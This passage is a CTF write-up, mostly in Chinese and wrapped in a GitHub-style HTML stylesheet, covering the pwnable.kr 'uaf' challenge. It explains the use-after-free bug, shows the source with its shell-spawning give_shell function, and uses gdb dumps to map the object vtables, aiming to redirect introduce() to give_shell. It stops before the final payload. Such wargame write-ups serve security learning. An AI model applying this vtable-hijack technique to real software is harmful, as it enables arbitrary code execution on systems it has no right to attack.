@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>WriteUp</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="pwnable-kr-toddler-s-bottle-uaf">PWNABLE.KR-Toddler&#39;s Bottle-uaf</h1>
+<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
+<h2 id="problem-description">Problem Description</h2>
+<pre><code>Mommy, what is Use After Free bug?
+
+ssh uaf@pwnable.kr -p2222 (pw:guest)
+</code></pre><p>这次是真的回归漏洞利用了，UAF漏洞，全名Use After Free，叫做释放后重用</p>
+<pre><code>wnagzihxain@toT0C:~$ ssh uaf@pwnable.kr -p2222
+uaf@pwnable.kr&#39;s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#39; / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  &#39;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+Last login: Mon Oct 16 18:51:01 2017 from 73.162.46.141
+</code></pre><p>查看文件</p>
+<pre><code>uaf@ubuntu:~$ ls -l
+total 24
+-rw-r----- 1 root uaf_pwn    22 Sep 25  2015 flag
+-r-xr-sr-x 1 root uaf_pwn 15463 Sep 25  2015 uaf
+-rw-r--r-- 1 root root     1431 Sep 25  2015 uaf.cpp
+</code></pre><p>拷贝回来</p>
+<pre><code>wnagzihxain@toT0C:~$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf.cpp /home/wnagzihxain/uaf.cpp
+uaf@pwnable.kr&#39;s password: 
+uaf.cpp                                                       100% 1431     1.4KB/s   00:01    
+wnagzihxain@toT0C:~$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf /home/wnagzihxain/uaf
+uaf@pwnable.kr&#39;s password: 
+uaf                                                           100%   15KB  15.1KB/s   00:01
+</code></pre><p>这是一个很典型的UAF，触发过程也很容易看出来，我们来看源码，首先有两个类对象指针，都已初始化，然后进入三个<code>case</code></p>
+<p>正常情况下，<code>case1</code>是两个类对象的<code>introduce()</code>函数，<code>case2</code>是获取该指令执行时获取的参数然后写入新申请的一个空间，<code>case3</code>是删除这两个类对象，看起来一切都很和谐，但是如果我们先执行<code>case3</code>，然后执行<code>case2</code>，再执行<code>case1</code>，这就不对了，如果有同学不懂UAF细节的，结合这个漏洞类型<code>释放后重用</code>理解一下，我们先释放，再去调用类对象的函数，在先释放两个类对象后，如果此时我们立刻申请内存空间，且申请的内存空间和释放对象的内存空间大小一样，那么系统就会将刚释放的类对象使用的内存空间用于我们的内存空间申请</p>
+<p>那么，<code>case2</code>的代码就等于我们有一个在原来类对象内存空间任意写数据的机会，再接下来，我们执行<code>case1</code>，就。。。。。。</p>
+<p>如果我们刚好覆盖掉了某些函数的指针，就可以让它执行某些可利用的函数</p>
+<pre><code>Human* m = new Man(&quot;Jack&quot;, 25);
+Human* w = new Woman(&quot;Jill&quot;, 21);
+
+size_t len;
+char* data;
+unsigned int op;
+while(1) {
+    cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
+    cin &gt;&gt; op;
+    switch(op) {
+        case 1:
+            m-&gt;introduce();
+            w-&gt;introduce();
+            break;
+        case 2:
+            len = atoi(argv[1]);
+            data = new char[len];
+            read(open(argv[2], O_RDONLY), data, len);
+            cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
+            break;
+        case 3:
+            delete m;
+            delete w;
+            break;
+        default:
+            break;
+    }
+}
+</code></pre><p>我们看这两个类对象的定义<code>Man</code>和<code>Woman</code>都是继承自<code>Human</code>，<code>Human</code>有两个虚函数，这里有两个可以直接看出来的点：</p>
+<ul>
+<li>两个继承自<code>Human</code>的类都有自己的<code>introduce()</code>函数，而<code>Human</code>类也有，那么在生成的虚函数表里，该函数的指针就是两个子类的<code>introduce()</code>函数地址，而不是父类的<code>introduce()</code>函数地址</li></ul>
+<pre><code>class Human {
+private:
+    virtual void give_shell() {
+        system(&quot;/bin/sh&quot;);
+    }
+protected:
+    int age;
+    string name;
+public:
+    virtual void introduce() {
+        cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;
+        cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;
+    }
+};
+
+class Man: public Human {
+public:
+    Man(string name, int age) {
+        this-&gt;name = name;
+        this-&gt;age = age;
+    }
+    virtual void introduce() {
+        Human::introduce();
+        cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;
+    }
+};
+
+class Woman: public Human {
+public:
+    Woman(string name, int age) {
+        this-&gt;name = name;
+        this-&gt;age = age;
+    }
+    virtual void introduce() {
+         Human::introduce();
+        cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;
+    }
+};
+</code></pre><p>那么，如同前面说的，我们有一个向原对象内存空间任意写数据的机会，并且可以进行调用，如果我们把原来的函数指针覆盖掉成为某些可以利用的函数地址，就相当于控制了EIP，我们再来观察，<code>Human</code>还有一个虚函数<code>give_shell()</code>，而这个函数可以返回一个shell</p>
+<pre><code>private:
+    virtual void give_shell() {
+        system(&quot;/bin/sh&quot;);
+    }
+</code></pre><p>最后一个知识点，就是类对象空间的数据是如何排布的？</p>
+<p>这个问题，我们可以使用gdb来动态调试一下看看，在IDA的反编译窗口里也可以看出一部分内存的排布情况</p>
+<pre><code>if ( v17 == 1 )
+{
+    (*(void (__fastcall **)(Human *, int *))(*(_QWORD *)v13 + 8LL))(v13, &amp;v17);
+    (*(void (__fastcall **)(Human *))(*(_QWORD *)v14 + 8LL))(v14);
+}
+</code></pre><p>单步走下来，走到<code>new</code>两个<code>Human</code>子类对象的指令</p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x614c50 --&gt; 0x0 
+RBX: 0x614c50 --&gt; 0x0 
+RCX: 0x7ffff7839b20 --&gt; 0x100000000 
+RDX: 0x19 
+RSI: 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+RDI: 0x614c50 --&gt; 0x0 
+RBP: 0x7fffffffe380 --&gt; 0x4013b0 (&lt;__libc_csu_init&gt;:    mov    QWORD PTR [rsp-0x28],rbp)
+RSP: 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+RIP: 0x400f13 (&lt;main+79&gt;:    call   0x401264 &lt;_ZN3ManC2ESsi&gt;)
+R8 : 0x7ffff7dd4ac0 --&gt; 0x7ffff7dcf838 --&gt; 0x7ffff7b76f60 (&lt;_ZNSt7num_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEED2Ev&gt;:    )
+R9 : 0x7ffff7dc9780 --&gt; 0x602210 --&gt; 0x7ffff7ae0d40 (&lt;_ZN10__cxxabiv117__class_type_infoD2Ev&gt;:    )
+R10: 0xe0e 
+R11: 0x7ffff7ae2e60 (&lt;_Znwm&gt;:    push   rbx)
+R12: 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+R13: 0x7fffffffe460 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400f08 &lt;main+68&gt;:    mov    edx,0x19
+   0x400f0d &lt;main+73&gt;:    mov    rsi,r12
+   0x400f10 &lt;main+76&gt;:    mov    rdi,rbx
+=&gt; 0x400f13 &lt;main+79&gt;:    call   0x401264 &lt;_ZN3ManC2ESsi&gt;
+   0x400f18 &lt;main+84&gt;:    mov    QWORD PTR [rbp-0x38],rbx
+   0x400f1c &lt;main+88&gt;:    lea    rax,[rbp-0x50]
+   0x400f20 &lt;main+92&gt;:    mov    rdi,rax
+   0x400f23 &lt;main+95&gt;:    call   0x400d00 &lt;_ZNSsD1Ev@plt&gt;
+Guessed arguments:
+arg[0]: 0x614c50 --&gt; 0x0 
+arg[1]: 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+arg[2]: 0x19 
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+0008| 0x7fffffffe328 --&gt; 0x10000ffff 
+0016| 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+0024| 0x7fffffffe338 --&gt; 0x401177 (&lt;_GLOBAL__sub_I_main+19&gt;:    pop    rbp)
+0032| 0x7fffffffe340 --&gt; 0x1 
+0040| 0x7fffffffe348 --&gt; 0x40140d (&lt;__libc_csu_init+93&gt;:    add    rbx,0x1)
+0048| 0x7fffffffe350 --&gt; 0x0 
+0056| 0x7fffffffe358 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000000400f13 in main ()
+</code></pre><p>第一个参数指向的其实就是内存空间，可以通过RAX寄存器返回值</p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x614c50 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:    push   rbp)
+RBX: 0x614c50 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:    push   rbp)
+RCX: 0x0 
+RDX: 0x19 
+RSI: 0x7ffff7dd6140 --&gt; 0x0 
+RDI: 0x614c20 --&gt; 0x4 
+RBP: 0x7fffffffe380 --&gt; 0x4013b0 (&lt;__libc_csu_init&gt;:    mov    QWORD PTR [rsp-0x28],rbp)
+RSP: 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+RIP: 0x400f18 (&lt;main+84&gt;:    mov    QWORD PTR [rbp-0x38],rbx)
+R8 : 0x7ffff7dd6158 --&gt; 0x0 
+R9 : 0x1 
+R10: 0x4bf 
+R11: 0x7ffff7b253a0 (&lt;_ZNSs6assignERKSs&gt;:    push   rbx)
+R12: 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+R13: 0x7fffffffe460 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400f0d &lt;main+73&gt;:    mov    rsi,r12
+   0x400f10 &lt;main+76&gt;:    mov    rdi,rbx
+   0x400f13 &lt;main+79&gt;:    call   0x401264 &lt;_ZN3ManC2ESsi&gt;
+=&gt; 0x400f18 &lt;main+84&gt;:    mov    QWORD PTR [rbp-0x38],rbx
+   0x400f1c &lt;main+88&gt;:    lea    rax,[rbp-0x50]
+   0x400f20 &lt;main+92&gt;:    mov    rdi,rax
+   0x400f23 &lt;main+95&gt;:    call   0x400d00 &lt;_ZNSsD1Ev@plt&gt;
+   0x400f28 &lt;main+100&gt;:    lea    rax,[rbp-0x12]
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+0008| 0x7fffffffe328 --&gt; 0x10000ffff 
+0016| 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+0024| 0x7fffffffe338 --&gt; 0x401177 (&lt;_GLOBAL__sub_I_main+19&gt;:    pop    rbp)
+0032| 0x7fffffffe340 --&gt; 0x1 
+0040| 0x7fffffffe348 --&gt; 0x40140d (&lt;__libc_csu_init+93&gt;:    add    rbx,0x1)
+0048| 0x7fffffffe350 --&gt; 0x0 
+0056| 0x7fffffffe358 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000000400f18 in main ()
+</code></pre><p>查看该对象指针指向的数据</p>
+<pre><code>gdb-peda$ x/20x $rax
+0x614c50:    0x0000000000401570    0x0000000000000019
+0x614c60:    0x0000000000614c38    0x00000000000203a1
+0x614c70:    0x0000000000000000    0x0000000000000000
+0x614c80:    0x0000000000000000    0x0000000000000000
+0x614c90:    0x0000000000000000    0x0000000000000000
+0x614ca0:    0x0000000000000000    0x0000000000000000
+0x614cb0:    0x0000000000000000    0x0000000000000000
+0x614cc0:    0x0000000000000000    0x0000000000000000
+0x614cd0:    0x0000000000000000    0x0000000000000000
+0x614ce0:    0x0000000000000000    0x0000000000000000
+</code></pre><p>然后走完第二个对象的创建过程，观察RAX寄存器的值</p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x614ca0 --&gt; 0x401550 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:    push   rbp)
+RBX: 0x614ca0 --&gt; 0x401550 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:    push   rbp)
+RCX: 0x0 
+RDX: 0x15 
+RSI: 0x7ffff7dd6140 --&gt; 0x0 
+RDI: 0x614c70 --&gt; 0x4 
+RBP: 0x7fffffffe380 --&gt; 0x4013b0 (&lt;__libc_csu_init&gt;:    mov    QWORD PTR [rsp-0x28],rbp)
+RSP: 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+RIP: 0x400f76 (&lt;main+178&gt;:    mov    QWORD PTR [rbp-0x30],rbx)
+R8 : 0x7ffff7dd6158 --&gt; 0x0 
+R9 : 0x1 
+R10: 0x15b 
+R11: 0x7ffff7b057e0 (&lt;_ZNSaIcED2Ev&gt;:    repz ret)
+R12: 0x7fffffffe340 --&gt; 0x614c88 --&gt; 0x6c6c694a (&#39;Jill&#39;)
+R13: 0x7fffffffe460 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400f6b &lt;main+167&gt;:    mov    rsi,r12
+   0x400f6e &lt;main+170&gt;:    mov    rdi,rbx
+   0x400f71 &lt;main+173&gt;:    call   0x401308 &lt;_ZN5WomanC2ESsi&gt;
+=&gt; 0x400f76 &lt;main+178&gt;:    mov    QWORD PTR [rbp-0x30],rbx
+   0x400f7a &lt;main+182&gt;:    lea    rax,[rbp-0x40]
+   0x400f7e &lt;main+186&gt;:    mov    rdi,rax
+   0x400f81 &lt;main+189&gt;:    call   0x400d00 &lt;_ZNSsD1Ev@plt&gt;
+   0x400f86 &lt;main+194&gt;:    lea    rax,[rbp-0x11]
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe320 --&gt; 0x7fffffffe468 --&gt; 0x7fffffffe7c2 (&quot;/home/wnagzihxain/uaf&quot;)
+0008| 0x7fffffffe328 --&gt; 0x10000ffff 
+0016| 0x7fffffffe330 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+0024| 0x7fffffffe338 --&gt; 0x401177 (&lt;_GLOBAL__sub_I_main+19&gt;:    pop    rbp)
+0032| 0x7fffffffe340 --&gt; 0x614c88 --&gt; 0x6c6c694a (&#39;Jill&#39;)
+0040| 0x7fffffffe348 --&gt; 0x614c50 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:    push   rbp)
+0048| 0x7fffffffe350 --&gt; 0x0 
+0056| 0x7fffffffe358 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000000400f76 in main ()
+</code></pre><p>查看指向的空间，同时跟前面进行对比</p>
+<pre><code>gdb-peda$ x/20 0x614c50
+0x614c50:    0x0000000000401570    0x0000000000000019
+0x614c60:    0x0000000000614c38    0x0000000000000031
+0x614c70:    0x0000000000000004    0x0000000000000004
+0x614c80:    0x0000000000000001    0x000000006c6c694a
+0x614c90:    0x0000000000000000    0x0000000000000021
+0x614ca0:    0x0000000000401550    0x0000000000000015
+0x614cb0:    0x0000000000614c88    0x0000000000020351
+0x614cc0:    0x0000000000000000    0x0000000000000000
+0x614cd0:    0x0000000000000000    0x0000000000000000
+0x614ce0:    0x0000000000000000    0x0000000000000000
+</code></pre><p>可以看到上面是两组，第一个值是该对象的虚函数表</p>
+<pre><code>0x614c50:    0x0000000000401570
+0x614ca0:    0x0000000000401550
+</code></pre><p>我们看一下第一个对象的虚表</p>
+<pre><code>gdb-peda$ x/10 0x401570
+0x401570 &lt;_ZTV3Man+16&gt;:    0x000000000040117a    0x00000000004012d2
+0x401580 &lt;_ZTV5Human&gt;:    0x0000000000000000    0x00000000004015f0
+0x401590 &lt;_ZTV5Human+16&gt;:    0x000000000040117a    0x0000000000401192
+0x4015a0 &lt;_ZTS5Woman&gt;:    0x00006e616d6f5735    0x0000000000000000
+0x4015b0 &lt;_ZTI5Woman&gt;:    0x0000000000602390    0x00000000004015a0
+0x401600:    0x0000007c3b031b01    0xfffff6400000000e
+</code></pre><p>第一个函数指针，我们对照着IDA，这个指针指向的是<code>give_shell()</code></p>
+<p><img src="Image/1.png" alt=""></p>
+<p>第二个函数指针，就是我们在IDA里看到的<code>*(_QWORD *)v13 + 8LL)</code></p>
+<p><img src="Image/2.png" alt=""></p>
+<p>那么我们把<code>give_shell()</code>函数的地址写进存储<code>introduce()</code>函数指针的地址，当调用<code>m-&gt;introduce()</code>时，即可完成shell的获取</p>
+<p>退出程序，使用带参数的命令启动，先要创建一个文件</p>
+<pre><code>wnagzihxain@tot0c ~&gt; echo &quot;1234567&quot; &gt; pwn
+wnagzihxain@tot0c ~&gt; cat pwn
+1234567
+</code></pre><p>设置参数</p>
+<pre><code>gdb-peda$ set args 8 pwn
